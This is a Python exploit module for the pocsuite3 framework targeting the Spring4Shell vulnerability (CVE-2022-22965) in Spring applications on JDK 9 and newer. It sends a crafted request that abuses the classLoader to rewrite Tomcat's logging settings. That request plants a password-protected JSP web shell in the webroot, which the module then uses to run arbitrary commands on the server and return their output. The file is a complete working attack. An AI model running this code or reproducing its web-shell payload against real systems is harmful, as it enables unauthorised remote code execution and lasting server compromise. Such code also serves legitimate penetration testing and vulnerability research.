#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import re
import time
import hashlib

from pocsuite3.lib.utils import random_str
from collections import OrderedDict
from pocsuite3.api import OptString
from pocsuite3.api import (
    Output, POCBase, register_poc, logger, requests,
    get_listener_ip, get_listener_port
)


class TestPOC(POCBase):
    vulID = 'CVE-2022-22965'
    version = '1.0'
    author = ['风起']
    vulDate = '2022-03-29'
    createDate = '2022-03-30'
    updateDate = '2022-03-30'
    references = ['https://www.lunasec.io/docs/blog/spring-rce-vulnerabilities/']
    name = 'Spring4Shell'
    appPowerLink = 'https://github.com/spring-projects/spring-boot'
    appName = 'SpringBoot'
    appVersion = '*'
    vulType = 'rce'
    desc = 'that users running JDK version 9 and newer are vulnerable to an RCE attack.'
    samples = ['']
    install_requires = []

    def _check(self):
        self.url = self.url.rstrip('/')
        try:
            res = requests.get(
                self.url,
                timeout=10,
                verify=False
            )
        except requests.HTTPError:
            return False
        return (
                res.status_code == 200
        )

    def _rce(self, path):
        self.ip = self.url.split('://')[-1].split('/')[0].split(':')[0]
        salt = '0u0bR8AynSQNVR066'
        m = hashlib.md5()
        m.update((self.ip + salt).encode())
        self.sn = '%s' % m.hexdigest()[0:10]
        flag = random_str(10)
        res = self._exec(code=f'echo {flag}')
        if flag in res:
            return True
        headers = {
            "suffix": "%>&&&&&//",
            "c1": "Runtime",
            "c2": "&&&&&<%",
            "DNT": "1",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        data = f"class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22fengqi%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory={path}&class.module.classLoader.resources.context.parent.pipeline.first.prefix={self.sn}&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
        try:
            requests.post(
                self.url,
                data=data,
                headers=headers,
                timeout=5,
                verify=False
            )
        except Exception:
            pass
        res = self._exec(code=f'echo {flag}')
        return flag in res

    def _exec(self, cmd='', code=''):
        if cmd:
            code = cmd
        result = ""
        time.sleep(3)
        try:
            res = requests.get(
                f'{self.url}/{self.sn}.jsp?pwd=fengqi&cmd={code}',
                timeout=10,
                verify=False
            )
            response = re.findall("&&&&&((?:.|\n)*)&&&&&//", res.text)[0]
            result = re.sub("\n", " ", response)
            logger.debug(result)
        except Exception:
            pass
        return result

    def _options(self):
        o = OrderedDict()
        o['path'] = OptString('webapps/ROOT/', description='The command to tomcat path')
        o['cmd'] = OptString('uname -a', description='The command to execute')
        return o

    def _verify(self):
        result = {}
        tomcat_path = self.get_option('path')
        if not (self._check() and self._rce(tomcat_path)):
            return self.parse_output(result)
        result['VerifyInfo'] = {}
        result['VerifyInfo']['URL'] = self.url
        return self.parse_output(result)

    def _attack(self):
        result = {}
        tomcat_path = self.get_option('path')
        if not (self._check() and self._rce(tomcat_path)):
            return self.parse_output(result)
        cmd = self.get_option('cmd')
        res = self._exec(cmd=cmd)
        result['VerifyInfo'] = {}
        result['VerifyInfo']['URL'] = f"{self.url}/{self.sn}.jsp"
        result['VerifyInfo'][cmd] = res
        return self.parse_output(result)

    def _shell(self):
        return self._verify()

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register_poc(TestPOC)
